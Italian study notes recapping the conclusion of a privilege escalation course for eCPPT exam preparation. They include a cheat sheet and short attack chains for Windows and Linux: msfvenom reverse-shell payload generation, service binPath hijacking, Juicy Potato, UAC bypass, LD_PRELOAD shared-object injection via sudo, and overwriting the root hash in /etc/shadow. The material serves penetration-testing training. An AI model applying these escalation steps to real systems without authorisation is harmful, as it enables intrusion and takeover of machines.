# 019 — Course Conclusion (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 19/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [019_Course Conclusion.txt](019_Course Conclusion.txt) · [019_Course Conclusion.srt](019_Course Conclusion.srt)

## Concetti chiave

- Video di chiusura del modulo **Privilege Escalation**: revisione dei **learning objectives** dichiarati nell'introduzione.
- Quattro pilastri trattati: concetto di privesc → vulnerabilità comuni → enumerazione sistema → tecniche Windows + Linux.
- Tool centrali coperti: **PowerSploit/PowerUp**, **Metasploit**, **PowerShell**, **GTFOBins**, **Procmon**, **UACMe**.
- Tecniche avanzate menzionate esplicitamente come obiettivo soddisfatto: **DLL Hijacking**, **UAC Bypass**, **Shared Object Injection**.

## Spiegazione approfondita

### Learning Objectives — revisione

#### 1. Understand the Concept of Privilege Escalation
Definizione e importanza nel pentest / red teaming. Coperto trasversalmente in tutti i video tramite esempi pratici su Windows e Linux.

#### 2. Identify Common Vulnerabilities Leading to Privilege Escalation
- Misconfigurazioni e security flaws su Windows e Linux.
- Recognize typical attack vectors → catene di exploit moderne e applicabili.
- Approccio: ogni video ha teoria + lab pratico.

#### 3. Conduct System Enumeration
- **Windows**: focus su **PowerUp** (PowerSploit) per automatizzare la discovery di service permissions, registry autoruns, unquoted service path, ecc.
- **Linux**: enumerazione manuale (`find` per SUID, `sudo -l`, `ls -al` su file sensibili) + risorse come **GTFOBins**. Niente strumento automatico imposto, anche se LinPEAS è lo standard de facto.

#### 4. Apply Techniques to Escalate Privileges on Windows
- Insecure services, token impersonation, unquoted service path, registry autoruns, DLL hijacking.
- Tools: **Metasploit**, **PowerShell**, **PowerUp**.

#### 5. Apply Techniques to Escalate Privileges on Linux
- SUID binaries, misconfigured sudo, file permissions, shared library injection.

#### 6. Implement Advanced Privilege Escalation Techniques
- **DLL Hijacking** (Windows).
- **UAC Bypass** (UACMe).
- **Shared Object Injection** (Linux, `LD_PRELOAD`).

### Mappa videos → tecniche (recap modulo completo)

| # | Video | Sistema | Tecnica chiave |
|---|---|---|---|
| 01 | Course Introduction | — | Objectives |
| 02 | Privilege Escalation Theory | — | Definizioni |
| 03 | PowerUp | Windows | Discovery automatica |
| 04 | PrivescCheck | Windows | Discovery alternativa |
| 05 | Unquoted Service Path | Windows | Service exploitation |
| 06 | Weak Registry Permissions | Windows | Registry autoruns |
| 07 | Insecure Service Executables | Windows | Replace binary |
| 08 | Insecure Service Permissions | Windows | sc config + restart |
| 09 | DLL Hijacking → token theory | Windows | Theory bridge |
| 10 | Token Impersonation (Metasploit) | Windows | incognito |
| 11 | Juicy Potato | Windows | Token impersonation evoluzione |
| 12 | Bypassing UAC with UACMe | Windows | UAC bypass |
| 13 | DLL Hijacking | Windows | Phantom DLL |
| 14 | Locally Stored Credentials | Linux | Credential harvesting |
| **15** | **Misconfigured File Permissions** | **Linux** | **/etc/shadow writable** |
| **16** | **Exploiting SUID Binaries** | **Linux** | **GTFOBins SUID** |
| **17** | **Misconfigured SUDO Privileges** | **Linux** | **GTFOBins Sudo** |
| **18** | **Shared Library Injection** | **Linux** | **LD_PRELOAD + sudo** |
| **19** | **Course Conclusion** | — | Recap |

## Comandi & strumenti — Cheat Sheet riassuntivo del modulo

### Windows
| Comando | Scopo |
|---|---|
| `. .\PowerUp.ps1; Invoke-AllChecks` | Privesc discovery completa |
| `. .\PrivescCheck.ps1; Invoke-PrivescCheck` | Discovery alternativa |
| `sc qc <service>` / `sc config <service> binPath=` | Service exploitation |
| `accesschk.exe -uwcqv <user> *` | ACL services |
| `Procmon64.exe` + filtri NAME NOT FOUND | DLL hijack discovery |
| `msfvenom -p windows/meterpreter/reverse_tcp -f dll/exe` | Payload generation |
| Metasploit `use exploit/windows/local/...` | Local exploits |
| `incognito` (post-module) | Token impersonation |
| `Juicy Potato` | SeImpersonate → SYSTEM |
| **UACMe** | UAC bypass |

### Linux
| Comando | Scopo |
|---|---|
| `find / -writable -type f 2>/dev/null` | File scrivibili |
| `find / -perm -u=s -type f 2>/dev/null` | SUID binaries |
| `sudo -l` | Privilegi sudo |
| `openssl passwd -1 -salt abc password` | Hash per shadow/passwd |
| `gcc -fPIC -shared -o evil.so evil.c -nostartfiles` | Compile malicious `.so` |
| `sudo LD_PRELOAD=/path/evil.so <binary>` | Trigger LD_PRELOAD |
| **GTFOBins** | SUID/sudo escape lookup |
| **LinPEAS** | Discovery automatica Linux |

## Esempi pratici — Attack chains tipiche

```
[Windows] User → PowerUp Invoke-AllChecks
        → Unquoted Service Path
        → drop exe in path intermedio
        → restart service
        → SYSTEM shell

[Windows] User in Local Admin (Medium IL)
        → UACMe method 23 (DLL hijack pkgmgr)
        → bypass UAC
        → High IL Admin
        → SeImpersonate → Juicy Potato
        → SYSTEM

[Linux] student
        → sudo -l → NOPASSWD: /usr/bin/man
        → GTFOBins man → sudo man man → !/bin/sh
        → root

[Linux] student
        → sudo -l → env_keep+=LD_PRELOAD + (root) apache2
        → write shell.c → gcc -fPIC -shared -nostartfiles
        → sudo LD_PRELOAD=/tmp/shell.so apache2
        → root

[Linux] student
        → find / -writable → /etc/shadow
        → openssl passwd -1 -salt abc password
        → vim /etc/shadow → reset root hash
        → su root
```

## Punti d'attenzione per l'esame eCPPT

- **Approccio "enumerazione → identificazione → exploitation"** vale per Windows E Linux. Non saltare l'enum.
- **Strumenti da memorizzare**: PowerUp (Win), GTFOBins (Linux), Metasploit (entrambi), Procmon (Win DLL).
- **Top 5 Windows privesc per esame**: Unquoted Service Path, Weak Service Permissions, DLL Hijacking, Token Impersonation (Juicy Potato), UAC Bypass.
- **Top 5 Linux privesc per esame**: SUID GTFOBins, Sudo GTFOBins, /etc/shadow writable, LD_PRELOAD via sudo, kernel exploit (non coperto qui ma fondamentale).
- **GTFOBins memorizzazione**: almeno `vim`, `find`, `awk`, `less`, `bash`, `python`, `perl`, `cp`, `tar`, `nmap`.
- **Comando `find` per SUID** è probabilmente il singolo comando più importante del modulo Linux: `find / -perm -u=s -type f 2>/dev/null`.
- **Pattern catene multi-step**: la potenza non sta in un singolo trick ma nel concatenare misconfig → es. SUID vim → modifica sudoers → sudo bash. Esame eCPPT premia il ragionamento a catena.
- L'istruttore conferma che il **lab Linux è 100% pratico** e prima senza tool automatici → impara la versione manuale.

## Collegamenti con altri video

- Precedente: [[018_ Shared Library Injection]] — ultimo video tecnico.
- Modulo successivo: **Lateral Movement & Pivoting** (post-privesc, muoversi nella rete).
- Modulo precedente: **Active Directory Penetration Testing** (privesc in AD complementare).
- Riferimenti finali ricorrenti:
  - **GTFOBins**: https://gtfobins.github.io
  - **LOLBAS** (Windows equivalente): https://lolbas-project.github.io
  - **PayloadsAllTheThings — Privilege Escalation**: https://github.com/swisskyrepo/PayloadsAllTheThings
  - **HackTricks**: https://book.hacktricks.xyz
